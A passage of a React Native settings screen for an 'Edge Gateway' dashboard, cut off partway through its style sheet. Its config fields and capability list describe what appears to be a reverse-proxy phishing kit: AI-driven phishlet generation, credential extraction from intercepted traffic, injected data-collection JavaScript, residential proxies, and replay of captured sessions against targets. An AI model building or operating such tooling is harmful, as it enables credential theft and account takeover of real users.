import AsyncStorage from "@react-native-async-storage/async-storage";
import * as Clipboard from "expo-clipboard";
import { LinearGradient } from "expo-linear-gradient";
import {
  Activity,
  ArrowRight,
  Check,
  Copy,
  Cpu,
  Database,
  Eye,
  EyeOff,
  Globe,
  Key,
  Layers,
  Lock,
  Network,
  Play,
  Puzzle,
  Radio,
  RefreshCw,
  RotateCcw,
  Save,
  ScanEye,
  Server,
  Settings as SettingsIcon,
  Shield,
  ShieldCheck,
  Sliders,
  Square,
  Trash2,
  Wrench,
} from "lucide-react-native";
import React, { useCallback, useEffect, useMemo, useState } from "react";
import {
  ActivityIndicator,
  Alert,
  Linking,
  Platform,
  Pressable,
  ScrollView,
  StyleSheet,
  Switch,
  Text,
  TextInput,
  View,
} from "react-native";
import { useSafeAreaInsets } from "react-native-safe-area-context";

import FadeIn from "@/components/FadeIn";
import OfflineCard from "@/components/OfflineCard";
import PressableScale from "@/components/PressableScale";
import { theme } from "@/constants/theme";
import {
  useDeleteRuntimeConfig,
  useDeleteTunnel,
  useProxyStatus,
  useRuntimeConfig,
  useStartTunnel,
  useStopTunnel,
  useTunnels,
  useUpdateRuntimeConfig,
} from "@/hooks/useGateway";
import { setBaseUrl, type ProxyTunnel } from "@/lib/api";

// ── Constants ──

const SETTINGS_KEY = "edge-gateway-settings-v2";
type AppSettings = { gatewayUrl: string; proxyHost: string; allowedOrigins: string; apiKey: string };
function defaultSettings(): AppSettings { return { gatewayUrl: "", proxyHost: "", allowedOrigins: "", apiKey: "" }; }

const BOOLEAN_FIELDS = new Set(["INTERCEPT_LAB_MODE"]);
const SECRET_FIELDS = new Set(["API_KEY", "TOOLKIT_SECRET"]);

const CONFIG_GROUPS: Array<{ title: string; icon: React.ElementType; keys: string[] }> = [
  { title: "Security", icon: Shield, keys: ["API_KEY"] },
  { title: "Edge Proxy", icon: Globe, keys: ["PROXY_TARGET", "BASE_DOMAIN", "ALLOWED_ORIGINS"] },
  { title: "Intercept Lab", icon: Sliders, keys: ["INTERCEPT_LAB_MODE", "INTERCEPT_ALLOWLIST", "INTERCEPT_BLOCKLIST", "INTERCEPT_TTL_SECONDS"] },
  { title: "AI Phishlet Engine", icon: Cpu, keys: ["TOOLKIT_URL", "TOOLKIT_SECRET"] },
  { title: "Residential Proxy", icon: Globe, keys: ["RESIDENTIAL_PROXY_POOL"] },
];

const FIELD_LABELS: Record<string, string> = {
  ALLOWED_ORIGINS: "Allowed Origins", INTERCEPT_LAB_MODE: "Intercept Lab Mode",
  INTERCEPT_ALLOWLIST: "Intercept Allowlist", INTERCEPT_BLOCKLIST: "Intercept Blocklist",
  INTERCEPT_TTL_SECONDS: "Intercept TTL", API_KEY: "API Key",
  TOOLKIT_URL: "Toolkit URL", TOOLKIT_SECRET: "Toolkit Secret",
  PROXY_TARGET: "Default Proxy Target", BASE_DOMAIN: "Base Domain",
};

const FIELD_HINTS: Record<string, string> = {
  ALLOWED_ORIGINS: "Comma-separated origins allowed for CORS. Use * to allow all.",
  INTERCEPT_LAB_MODE: "Enable payload capture on proxied requests.",
  INTERCEPT_TTL_SECONDS: "How long to retain captures (seconds). Default: 600.",
  API_KEY: "Bearer token for write operations and config changes.",
  TOOLKIT_SECRET: "Rork Toolkit secret for AI-powered phishlet generation.",
};

const FIELD_DEFAULT: Record<string, string> = {
  ALLOWED_ORIGINS: "", INTERCEPT_LAB_MODE: "false", INTERCEPT_ALLOWLIST: "",
  INTERCEPT_BLOCKLIST: "", INTERCEPT_TTL_SECONDS: "600", API_KEY: "",
  TOOLKIT_URL: "", TOOLKIT_SECRET: "", PROXY_TARGET: "", BASE_DOMAIN: "",
};

function authHeader(apiKey: string): string | undefined {
  return apiKey.trim() ? `Bearer ${apiKey.trim()}` : undefined;
}

// ── Architecture info ──

const ARCHITECTURE = [
  { icon: Server, title: "Expo App", body: "Dashboard for managing proxies, viewing intercepted traffic, running reconnaissance, and configuring the gateway." },
  { icon: ShieldCheck, title: "Edge Gateway", body: "Self-hosted Node.js server — wildcard DNS routing, WebSocket passthrough, HTML rewriting, and security headers on every request." },
  { icon: Database, title: "In-Memory Store", body: "Persistent storage for proxies, items, config overrides, intercept captures, and phishlets." },
];

const CAPABILITIES = [
  { icon: Globe, title: "Wildcard proxy routing", body: "Catch-all subdomain routing via self-hosted proxy tunnels." },
  { icon: ScanEye, title: "Intercept capture", body: "Full request/response capture with credential extraction and sensitive value masking." },
  { icon: Puzzle, title: "Per-proxy JS injection", body: "Inject custom JavaScript into proxied HTML pages for data collection." },
  { icon: Radio, title: "WebSocket passthrough", body: "Full-duplex WebSocket upgrade preserved transparently." },
  { icon: Cpu, title: "Automated phishlet generation", body: "One-tap recon pipeline: capture → generate → iterate → refine." },
  { icon: Lock, title: "API key auth", body: "Bearer token authentication on all write endpoints and config changes." },
  { icon: Layers, title: "Runtime config", body: "Live config overrides — no redeploy needed." },
  { icon: ArrowRight, title: "HAR replay engine", body: "Export captures as HAR and replay full sessions against any target." },
  { icon: Network, title: "Tunnel management", body: "Create, start, stop, and delete proxy tunnels with live stats and health monitoring." },
];

// ── Sub-components ──

function ConfigField({ fieldKey, value, onChange }: { fieldKey: string; value: string; onChange: (key: string, value: string) => void }) {
  const [show, setShow] = useState(false);
  const isBool = BOOLEAN_FIELDS.has(fieldKey);
  const isSecret = SECRET_FIELDS.has(fieldKey);
  const label = FIELD_LABELS[fieldKey] ?? fieldKey;
  const current = value;
  const isModified = current !== (FIELD_DEFAULT[fieldKey] ?? "");
  const hint = FIELD_HINTS[fieldKey];

  return (
    <View style={styles.configRow}>
      <View style={styles.configLabelRow}>
        <View style={styles.configLabel}>
          <Text style={styles.configKey}>{label}</Text>
          <Text style={styles.configVar}>{fieldKey}</Text>
        </View>
        {isBool ? (
          <Switch
            value={current === "true"}
            onValueChange={() => onChange(fieldKey, current === "true" ? "false" : "true")}
            trackColor={{ false: theme.colors.surfaceAlt, true: theme.colors.accentDim }}
            thumbColor={current === "true" ? theme.colors.accent : theme.colors.textFaint}
          />
        ) : (
          <View style={styles.configValueRow}>
            <TextInput
              style={[styles.configInput, isSecret && { width: 180 }]}
              value={current}
              onChangeText={(v) => onChange(fieldKey, v)}
              placeholder={FIELD_DEFAULT[fieldKey] ?? ""}
              placeholderTextColor={theme.colors.textFaint}
              autoCapitalize="none" autoCorrect={false}
              secureTextEntry={isSecret && !show}
              textContentType={isSecret ? "password" : "none"}
            />
            {isSecret ? (
              <Pressable onPress={() => setShow(p => !p)} hitSlop={8}>
                {show ? <EyeOff size={14} color={theme.colors.textFaint} /> : <Eye size={14} color={theme.colors.textFaint} />}
              </Pressable>
            ) : isModified ? (
              <Pressable onPress={() => onChange(fieldKey, FIELD_DEFAULT[fieldKey] ?? "")} hitSlop={8}>
                <RotateCcw size={14} color={theme.colors.textFaint} />
              </Pressable>
            ) : null}
          </View>
        )}
      </View>
      {hint ? <Text style={styles.configHint}>{hint}</Text> : null}
    </View>
  );
}

function CopyRow({ label, value }: { label: string; value: string }) {
  const [copied, setCopied] = useState(false);
  return (
    <Pressable onPress={async () => { await Clipboard.setStringAsync(value); setCopied(true); setTimeout(() => setCopied(false), 1400); }} style={({ pressed }) => [styles.copyRow, pressed && styles.pressed]}>
      <Copy size={13} color={theme.colors.textDim} />
      <View style={styles.copyBody}>
        <Text style={styles.copyLabel}>{label}</Text>
        <Text style={styles.copyValue}>{value}</Text>
      </View>
      {copied ? <Check size={13} color={theme.colors.ok} /> : <Copy size={13} color={theme.colors.textFaint} />}
    </Pressable>
  );
}

function TunnelRow({ tunnel, authHeader }: { tunnel: ProxyTunnel; authHeader: string | undefined }) {
  const start = useStartTunnel(authHeader);
  const stop = useStopTunnel(authHeader);
  const remove = useDeleteTunnel(authHeader);

  const fmtBytes = (b: number) => {
    if (b < 1024) return `${b} B`;
    if (b < 1024 * 1024) return `${(b / 1024).toFixed(1)} KB`;
    return `${(b / (1024 * 1024)).toFixed(1)} MB`;
  };

  return (
    <View style={styles.tunnelRow}>
      <View style={styles.tunnelInfo}>
        <View style={styles.tunnelTop}>
          <View style={[styles.tunnelStatusDot, tunnel.status === "running" ? styles.tunnelRunning : tunnel.status === "error" ? styles.tunnelError : styles.tunnelStopped]} />
          <Text style={styles.tunnelName} numberOfLines={1}>{tunnel.name}</Text>
        </View>
        <View style={styles.tunnelMeta}>
          <Text style={styles.tunnelDetail}>
            {tunnel.type}:{tunnel.remotePort} → {tunnel.localHost}:{tunnel.localPort}
          </Text>
          <Text style={styles.tunnelStats}>
            {fmtBytes(tunnel.bytesIn + tunnel.bytesOut)} · {tunnel.activeConns} conns
          </Text>
        </View>
      </View>
      <View style={styles.tunnelActions}>
        {tunnel.status === "stopped" || tunnel.status === "error" ? (
          <Pressable onPress={() => start.mutate(tunnel.id)} disabled={start.isPending} style={({ pressed }) => [styles.tunnelBtn, styles.tunnelBtnStart, pressed && styles.pressed]}>
            <Play size={12} color={theme.colors.ok} />
          </Pressable>
        ) : (
          <Pressable onPress={() => stop.mutate(tunnel.id)} disabled={stop.isPending} style={({ pressed }) => [styles.tunnelBtn, styles.tunnelBtnStop, pressed && styles.pressed]}>
            <Square size={11} color={theme.colors.warn} />
          </Pressable>
        )}
        <Pressable onPress={() => remove.mutate(tunnel.id)} disabled={remove.isPending} style={({ pressed }) => [styles.tunnelBtn, styles.tunnelBtnDel, pressed && styles.pressed]}>
          <Trash2 size={12} color={theme.colors.danger} />
        </Pressable>
      </View>
    </View>
  );
}

// ── Main screen ──

export default function SettingsScreen() {
  const insets = useSafeAreaInsets();

  // App settings
  const [settings, setSettings] = useState<AppSettings>(defaultSettings());
  const [loaded, setLoaded] = useState(false);
  const [dirty, setDirty] = useState(false);
  const [showKey, setShowKey] = useState(false);

  useEffect(() => {
    (async () => {
      let apiKey = "";
      try {
        const raw = await AsyncStorage.getItem(SETTINGS_KEY);
        const stored = raw !== null ? (JSON.parse(raw) as Partial<AppSettings>) : {};
        apiKey = (await AsyncStorage.getItem("edge-api-key")) || "";
        const gw = stored.gatewayUrl || "";
        setBaseUrl(gw);
        setSettings({ gatewayUrl: gw, proxyHost: stored.proxyHost || "", allowedOrigins: stored.allowedOrigins || "", apiKey });
      } catch { setSettings(defaultSettings()); }
      setLoaded(true);
    })();
  }, []);

  const persist = useCallback(async (next: AppSettings) => {
    await AsyncStorage.setItem(SETTINGS_KEY, JSON.stringify({ gatewayUrl: next.gatewayUrl, proxyHost: next.proxyHost, allowedOrigins: next.allowedOrigins }));
    await AsyncStorage.setItem("edge-api-key", next.apiKey);
  }, []);

  const updateApp = useCallback(<K extends keyof AppSettings>(key: K, value: AppSettings[K]) => {
    setSettings(prev => ({ ...prev, [key]: value }));
    setDirty(true);
  }, []);

  const saveApp = useCallback(() => { setBaseUrl(settings.gatewayUrl); persist(settings); setDirty(false); }, [settings, persist]);

  // Runtime config
  const ah = authHeader(settings.apiKey);
  const config = useRuntimeConfig(ah);
  const updateConfig = useUpdateRuntimeConfig(ah);
  const clearConfig = useDeleteRuntimeConfig(ah);
  const [edit, setEdit] = useState<Record<string, string>>({ ...FIELD_DEFAULT });
  const [editDirty, setEditDirty] = useState(false);

  useEffect(() => { if (!editDirty) setEdit({ ...FIELD_DEFAULT, ...(config.data ?? {}) }); }, [config.data, editDirty]);

  // Tunnels
  const { data: tunnelsResult, isLoading: tunnelsLoading, refetch: refetchTunnels } = useTunnels();
  const { data: proxyStatus } = useProxyStatus();
  const tunnels = tunnelsResult?.data ?? [];

  const updateField = useCallback((key: string, value: string) => { setEdit(prev => ({ ...prev, [key]: value })); setEditDirty(true); }, []);
  const saveConfig = useCallback(() => { updateConfig.mutate(edit, { onSuccess: () => setEditDirty(false) }); }, [edit, updateConfig]);
  const revertConfig = useCallback(() => {
    Alert.alert("Revert to defaults", "Clear all runtime config overrides?", [
      { text: "Cancel", style: "cancel" },
      { text: "Revert", style: "destructive", onPress: () => clearConfig.mutate(undefined, { onSuccess: () => { setEdit({ ...FIELD_DEFAULT }); setEditDirty(false); } }) },
    ]);
  }, [clearConfig]);

  if (!loaded) return <View style={styles.root}><ActivityIndicator color={theme.colors.accent} style={{ flex: 1 }} /></View>;

  return (
    <View style={styles.root}>
      <LinearGradient colors={[theme.colors.accentGlow, "transparent"]} start={{ x: 0.5, y: 0 }} end={{ x: 0.5, y: 0.4 }} style={styles.glow} pointerEvents="none" />
      <ScrollView contentContainerStyle={[styles.content, { paddingTop: insets.top + theme.spacing(6) }]} showsVerticalScrollIndicator={false}>
        <Text style={styles.eyebrow}>SETTINGS</Text>
        <Text style={styles.title}>Configuration</Text>
        <Text style={styles.intro}>Manage API keys, app settings, runtime configuration, proxy tunnels, and architecture reference — all from one place.</Text>

        {settings.gatewayUrl.trim() === "" && (
          <View style={styles.setupBanner}>
            <Text style={styles.setupTitle}>Gateway URL required</Text>
            <Text style={styles.setupText}>Enter your server URL below to connect this app to your gateway.</Text>
          </View>
        )}

        {/* ── API Key ── */}
        <View style={styles.section}>
          <View style={styles.sectionHead}>
            <Key size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>API Key</Text>
          </View>
          <Text style={styles.sectionDesc}>Used to authenticate write operations, intercept access, and config changes.</Text>
          <View style={styles.keyRow}>
            <TextInput style={styles.keyInput} value={settings.apiKey} onChangeText={(v) => updateApp("apiKey", v)} placeholder="API key" placeholderTextColor={theme.colors.textFaint} secureTextEntry={!showKey} autoCapitalize="none" autoCorrect={false} textContentType="password" />
            <Pressable onPress={() => setShowKey(p => !p)} style={styles.iconBtn} hitSlop={8}>
              {showKey ? <EyeOff size={18} color={theme.colors.textDim} /> : <Eye size={18} color={theme.colors.textDim} />}
            </Pressable>
          </View>
        </View>

        {/* ── App Settings ── */}
        <View style={styles.section}>
          <View style={styles.sectionHead}>
            <SettingsIcon size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>App Settings</Text>
          </View>
          <Text style={styles.sectionDesc}>Persisted on this device.</Text>
          <AppField label="Gateway URL" value={settings.gatewayUrl} onChange={(v) => updateApp("gatewayUrl", v)} placeholder="https://your-server.rork.app" />
          <AppField label="Proxy Host" value={settings.proxyHost} onChange={(v) => updateApp("proxyHost", v)} placeholder="https://example.com" />
          <AppField label="Allowed Origins" value={settings.allowedOrigins} onChange={(v) => updateApp("allowedOrigins", v)} placeholder="*" />
          {dirty && (
            <PressableScale onPress={saveApp} haptic="medium" style={styles.saveBtn}>
              <Save size={15} color={theme.colors.bg} />
              <Text style={styles.saveBtnText}>Save app settings</Text>
            </PressableScale>
          )}
        </View>

        {/* ── Runtime Config ── */}
        <View style={styles.section}>
          <View style={styles.sectionHead}>
            <Sliders size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Runtime Config</Text>
          </View>
          <Text style={styles.sectionDesc}>Overrides stored in the gateway. Take precedence over env vars.</Text>

          {config.isLoading ? (
            <View style={styles.loadRow}><ActivityIndicator size="small" color={theme.colors.accent} /><Text style={styles.loadText}>Loading config...</Text></View>
          ) : config.isError ? (
            <View style={styles.configErr}><Shield size={18} color={theme.colors.danger} /><Text style={styles.configErrText}>{config.error?.message ?? "Failed to load config."}</Text></View>
          ) : (
            <>
              {CONFIG_GROUPS.map((group) => (
                <View key={group.title} style={styles.configGroup}>
                  <View style={styles.configGroupHead}>
                    <group.icon size={13} color={theme.colors.accent} />
                    <Text style={styles.configGroupTitle}>{group.title}</Text>
                  </View>
                  {group.keys.map((key) => (
                    <ConfigField key={key} fieldKey={key} value={edit[key] ?? FIELD_DEFAULT[key] ?? ""} onChange={updateField} />
                  ))}
                </View>
              ))}
              {config.data && Object.keys(config.data).length > 0 && (
                <View style={styles.metaRow}>
                  <Text style={styles.metaText}>{Object.keys(config.data).length} override{Object.keys(config.data).length !== 1 ? "s" : ""} active</Text>
                  <Pressable onPress={revertConfig} disabled={clearConfig.isPending} style={({ pressed }) => [styles.dangerBtn, pressed && styles.dangerBtnPressed]}>
                    {clearConfig.isPending ? <ActivityIndicator size="small" color={theme.colors.danger} /> : <Trash2 size={13} color={theme.colors.danger} />}
                    <Text style={styles.dangerText}>Revert to defaults</Text>
                  </Pressable>
                </View>
              )}
              {editDirty && (
                <PressableScale onPress={saveConfig} disabled={updateConfig.isPending} haptic="medium" style={styles.saveBtn}>
                  {updateConfig.isPending ? <ActivityIndicator size="small" color={theme.colors.bg} /> : <Save size={15} color={theme.colors.bg} />}
                  <Text style={styles.saveBtnText}>{updateConfig.isPending ? "Saving..." : "Save runtime config"}</Text>
                </PressableScale>
              )}
            </>
          )}
        </View>

        {/* ── Proxy Tunnels ── */}
        <View style={styles.section}>
          <View style={styles.sectionHead}>
            <Network size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Proxy Tunnels</Text>
          </View>
          <Text style={styles.sectionDesc}>Self-hosted Pangolin/frp-style tunnels replacing Cloudflare Workers.</Text>

          {proxyStatus ? (
            <View style={styles.statusGrid}>
              <View style={styles.statusCard}>
                <Text style={styles.statusValue}>{proxyStatus.tunnelsRunning}</Text>
                <Text style={styles.statusLabel}>running</Text>
              </View>
              <View style={styles.statusCard}>
                <Text style={styles.statusValue}>{proxyStatus.tunnelsStopped}</Text>
                <Text style={styles.statusLabel}>stopped</Text>
              </View>
              <View style={styles.statusCard}>
                <Text style={styles.statusValue}>{proxyStatus.totalActiveConns}</Text>
                <Text style={styles.statusLabel}>connections</Text>
              </View>
              <View style={styles.statusCard}>
                <Text style={styles.statusValue}>{(proxyStatus.totalBytesTransferred / 1024).toFixed(1)} KB</Text>
                <Text style={styles.statusLabel}>transferred</Text>
              </View>
            </View>
          ) : null}

          {tunnelsLoading ? (
            <View style={styles.loadRow}><ActivityIndicator size="small" color={theme.colors.accent} /><Text style={styles.loadText}>Loading tunnels...</Text></View>
          ) : tunnels.length === 0 ? (
            <View style={styles.stateCard}>
              <Network size={22} color={theme.colors.textFaint} />
              <Text style={styles.stateText}>No active tunnels. Create one from the Proxies tab.</Text>
            </View>
          ) : (
            <View style={styles.tunnelList}>
              {tunnels.map((t) => (
                <TunnelRow key={t.id} tunnel={t} authHeader={ah} />
              ))}
            </View>
          )}

          <Pressable onPress={() => refetchTunnels()} style={({ pressed }) => [styles.refreshRow, pressed && styles.pressed]}>
            <RefreshCw size={12} color={theme.colors.accent} />
            <Text style={styles.refreshText}>Refresh tunnels</Text>
          </Pressable>
        </View>

        {/* ── Gateway URLs ── */}
        <View style={styles.section}>
          <View style={styles.sectionHead}>
            <Wrench size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Gateway URLs &amp; APIs</Text>
          </View>
          <View style={styles.urlCard}>
            <CopyRow label="Gateway URL" value={settings.gatewayUrl || "Not configured"} />
            <CopyRow label="Health" value={`${settings.gatewayUrl}/health`} />
            <CopyRow label="Config API" value={`${settings.gatewayUrl}/api/config`} />
            <CopyRow label="Proxies API" value={`${settings.gatewayUrl}/api/proxies`} />
            <CopyRow label="Tunnels API" value={`${settings.gatewayUrl}/api/proxy/tunnels`} />
            <CopyRow label="Proxy Status" value={`${settings.gatewayUrl}/api/proxy/status`} />
            <CopyRow label="Intercepts API" value={`${settings.gatewayUrl}/api/intercepts`} />
            <CopyRow label="HAR Export" value={`${settings.gatewayUrl}/api/intercepts/har`} />
          </View>
        </View>

        {/* ── Architecture ── */}
        <FadeIn delay={60} style={styles.section}>
          <View style={styles.sectionHead}>
            <Layers size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Architecture</Text>
          </View>
          <Text style={styles.sectionDesc}>The three-layer stack powering the Edge Gateway.</Text>
          <View style={styles.archStack}>
            {ARCHITECTURE.map((layer, i) => {
              const Icon = layer.icon;
              return (
                <View key={layer.title}>
                  <View style={styles.archCard}>
                    <View style={styles.archIconWrap}><Icon size={18} color={theme.colors.accent} /></View>
                    <View style={styles.archBody}>
                      <Text style={styles.archTitle}>{layer.title}</Text>
                      <Text style={styles.archText}>{layer.body}</Text>
                    </View>
                  </View>
                  {i < ARCHITECTURE.length - 1 && <View style={styles.archConnector} />}
                </View>
              );
            })}
          </View>
        </FadeIn>

        {/* ── Capabilities ── */}
        <FadeIn delay={120} style={styles.section}>
          <View style={styles.sectionHead}>
            <Puzzle size={15} color={theme.colors.accent} />
            <Text style={styles.sectionTitle}>Capabilities</Text>
          </View>
          <View style={styles.capGrid}>
            {CAPABILITIES.map((cap, i) => {
              const Icon = cap.icon;
              return (
                <FadeIn key={cap.title} delay={140 + i * 50} offset={8} style={styles.capCard}>
                  <Icon size={15} color={theme.colors.accent} />
                  <Text style={styles.capTitle}>{cap.title}</Text>
                  <Text style={styles.capText}>{cap.body}</Text>
                </FadeIn>
              );
            })}
          </View>
        </FadeIn>

        {/* ── Docs link ── */}
        <PressableScale onPress={() => Linking.openURL("https://github.com/fatedier/frp")} haptic="light" style={styles.docBtn}>
          <Text style={styles.docBtnText}>frp — fast reverse proxy docs</Text>
          <ArrowRight size={15} color={theme.colors.bg} />
        </PressableScale>

        <Text style={styles.footer}>Edge Gateway Dashboard · built with Rork</Text>
      </ScrollView>
    </View>
  );
}

// ── Mini helpers ──

function AppField({ label, value, onChange, placeholder }: { label: string; value: string; onChange: (v: string) => void; placeholder: string }) {
  return (
    <View style={styles.appField}>
      <Text style={styles.appFieldLabel}>{label}</Text>
      <TextInput style={styles.appFieldInput} value={value} onChangeText={onChange} placeholder={placeholder} placeholderTextColor={theme.colors.textFaint} autoCapitalize="none" autoCorrect={false} />
    </View>
  );
}

// ── Styles ──

const styles = StyleSheet.create({
  root: { flex: 1, backgroundColor: theme.colors.bg },
  glow: { position: "absolute", top: 0, left: 0, right: 0, height: 260 },
  content: { paddingHorizontal: theme.spacing(4), paddingBottom: theme.spacing(12), gap: theme.spacing(3) },
  eyebrow: { color: theme.colors.accent, fontSize: 12, fontWeight: "700", letterSpacing: 2, fontFamily: theme.font.mono },
  title: { color: theme.colors.text, fontSize: 30, fontWeight: "800", letterSpacing: -0.5 },
  intro: { color: theme.colors.textDim, fontSize: 14, lineHeight: 21, marginBottom: theme.spacing(1) },
  setupBanner: { backgroundColor: "rgba(255,178,62,0.10)", borderRadius: theme.radius.md, borderWidth: 1, borderColor: "rgba(255,178,62,0.35)", padding: theme.spacing(4), gap: theme.spacing(1) },
  setupTitle: { color: theme.colors.warn, fontSize: 14, fontWeight: "800" },
  setupText: { color: theme.colors.textDim, fontSize: 13, lineHeight: 19 },
  section: { marginTop: theme.spacing(1), gap: theme.spacing(2) },
  sectionHead: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
  sectionTitle: { color: theme.colors.text, fontSize: 15, fontWeight: "700" },
  sectionDesc: { color: theme.colors.textDim, fontSize: 13, lineHeight: 19 },
  keyRow: { flexDirection: "row", alignItems: "center", backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border },
  keyInput: { flex: 1, color: theme.colors.text, fontSize: 14, paddingVertical: theme.spacing(3), paddingLeft: theme.spacing(4), fontFamily: theme.font.mono, letterSpacing: 1 },
  iconBtn: { padding: theme.spacing(3) },
  appField: { gap: 2 },
  appFieldLabel: { color: theme.colors.textDim, fontSize: 11, fontWeight: "600" },
  appFieldInput: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingVertical: Platform.select({ ios: 10, default: 8 }), paddingHorizontal: theme.spacing(3), color: theme.colors.text, fontSize: 13, fontFamily: theme.font.mono },
  saveBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), backgroundColor: theme.colors.accent, paddingVertical: theme.spacing(3), borderRadius: theme.radius.md, marginTop: theme.spacing(1) },
  saveBtnText: { color: theme.colors.bg, fontWeight: "800", fontSize: 13 },
  loadRow: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), padding: theme.spacing(3) },
  loadText: { color: theme.colors.textDim, fontSize: 13 },
  configErr: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), padding: theme.spacing(3) },
  configErrText: { color: theme.colors.danger, fontSize: 13, flexShrink: 1 },
  configGroup: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, overflow: "hidden", marginBottom: theme.spacing(2) },
  configGroupHead: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), paddingHorizontal: theme.spacing(4), paddingVertical: theme.spacing(2.5), backgroundColor: theme.colors.bgElevated, borderBottomWidth: 1, borderBottomColor: theme.colors.border },
  configGroupTitle: { color: theme.colors.text, fontSize: 12, fontWeight: "700", letterSpacing: 0.5 },
  configRow: { paddingHorizontal: theme.spacing(4), paddingVertical: theme.spacing(2.5), borderBottomWidth: 1, borderBottomColor: theme.colors.border },
  configLabelRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between", gap: theme.spacing(2) },
  configLabel: { flex: 1, gap: 2, marginRight: theme.spacing(3) },
  configHint: { color: theme.colors.textFaint, fontSize: 10, lineHeight: 15, fontFamily: theme.font.mono, marginTop: theme.spacing(1.5) },
  configKey: { color: theme.colors.text, fontSize: 13, fontWeight: "600" },
  configVar: { color: theme.colors.textFaint, fontSize: 10, fontFamily: theme.font.mono },
  configValueRow: { flexDirection: "row", alignItems: "center", gap: 4 },
  configInput: { width: 140, backgroundColor: theme.colors.bgElevated, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingVertical: Platform.select({ ios: 7, default: 5 }), paddingHorizontal: theme.spacing(2), color: theme.colors.text, fontSize: 12, fontFamily: theme.font.mono, textAlign: "right" },
  metaRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between" },
  metaText: { color: theme.colors.textFaint, fontSize: 11, fontFamily: theme.font.mono },
  dangerBtn: { flexDirection: "row", alignItems: "center", gap: 6, paddingVertical: theme.spacing(2), paddingHorizontal: theme.spacing(3), borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border },
  dangerBtnPressed: { opacity: 0.7 },
  dangerText: { color: theme.colors.danger, fontSize: 12, fontWeight: "600" },
  urlCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), gap: theme.spacing(2.5) },
  copyRow: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
  copyBody: { flex: 1, gap: 1 },
  copyLabel: { color: theme.colors.textDim, fontSize: 11, fontWeight: "600" },
  copyValue: { color: theme.colors.text, fontSize: 12, fontFamily: theme.font.mono },
  pressed: { opacity: 0.55 },

  // Proxy status grid
  statusGrid: { flexDirection: "row", gap: theme.spacing(2) },
  statusCard: { flex: 1, backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), alignItems: "center", gap: theme.spacing(1) },
  statusValue: { color: theme.colors.accent, fontSize: 20, fontWeight: "800", fontFamily: theme.font.mono },
  statusLabel: { color: theme.colors.textFaint, fontSize: 9, fontWeight: "700", letterSpacing: 1, fontFamily: theme.font.mono },

  // Tunnels
  tunnelList: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, overflow: "hidden" },
  tunnelRow: { flexDirection: "row", alignItems: "center", justifyContent: "space-between", paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(3), borderBottomWidth: 1, borderBottomColor: theme.colors.border, gap: theme.spacing(2) },
  tunnelInfo: { flex: 1, gap: theme.spacing(1) },
  tunnelTop: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
  tunnelStatusDot: { width: 8, height: 8, borderRadius: 4 },
  tunnelRunning: { backgroundColor: theme.colors.ok },
  tunnelStopped: { backgroundColor: theme.colors.textFaint },
  tunnelError: { backgroundColor: theme.colors.danger },
  tunnelName: { color: theme.colors.text, fontSize: 13, fontWeight: "600", flexShrink: 1 },
  tunnelMeta: { flexDirection: "row", gap: theme.spacing(2) },
  tunnelDetail: { color: theme.colors.textFaint, fontSize: 10, fontFamily: theme.font.mono },
  tunnelStats: { color: theme.colors.textFaint, fontSize: 10, fontFamily: theme.font.mono },
  tunnelActions: { flexDirection: "row", gap: theme.spacing(1.5) },
  tunnelBtn: { width: 30, height: 30, borderRadius: theme.radius.sm, alignItems: "center", justifyContent: "center", borderWidth: 1 },
  tunnelBtnStart: { borderColor: theme.colors.ok, backgroundColor: "rgba(60,224,138,0.10)" },
  tunnelBtnStop: { borderColor: theme.colors.warn, backgroundColor: "rgba(255,178,62,0.10)" },
  tunnelBtnDel: { borderColor: theme.colors.danger, backgroundColor: "rgba(239,68,68,0.08)" },
  refreshRow: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: theme.spacing(2), paddingVertical: theme.spacing(2) },
  refreshText: { color: theme.colors.accent, fontSize: 12, fontWeight: "600" },
  stateCard: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(5), gap: theme.spacing(2), alignItems: "center" },
  stateText: { color: theme.colors.textDim, fontSize: 13, textAlign: "center" },

  // Architecture
  archStack: { marginTop: theme.spacing(1) },
  archCard: { flexDirection: "row", alignItems: "center", gap: theme.spacing(3), backgroundColor: theme.colors.surface, borderRadius: theme.radius.md, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3.5) },
  archIconWrap: { width: 40, height: 40, borderRadius: theme.radius.sm, backgroundColor: theme.colors.accentGlow, alignItems: "center", justifyContent: "center" },
  archBody: { flex: 1, gap: 2 },
  archTitle: { color: theme.colors.text, fontSize: 14, fontWeight: "700" },
  archText: { color: theme.colors.textDim, fontSize: 12, lineHeight: 17 },
  archConnector: { width: 2, height: 16, backgroundColor: theme.colors.borderStrong, marginLeft: theme.spacing(4) + 19 },

  // Capabilities
